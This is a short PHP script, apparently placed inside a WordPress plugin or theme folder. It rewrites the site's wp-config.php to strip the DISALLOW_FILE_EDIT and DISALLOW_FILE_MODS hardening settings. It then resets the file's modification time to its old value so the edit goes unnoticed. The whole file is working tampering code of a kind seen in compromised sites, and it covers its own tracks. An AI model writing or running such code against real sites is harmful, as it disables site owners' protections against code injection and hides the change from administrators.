<?php

$str = file_get_contents("../../wp-config.php");

$str = str_replace("define('DISALLOW_FILE_EDIT', true);","",$str);
$str = str_replace("define('DISALLOW_FILE_MODS', true);","",$str);

$ftime1 = filemtime("../../wp-config.php");

file_put_contents("../../wp-config.php", $str);
touch("../../wp-config.php", $ftime1, $ftime1);
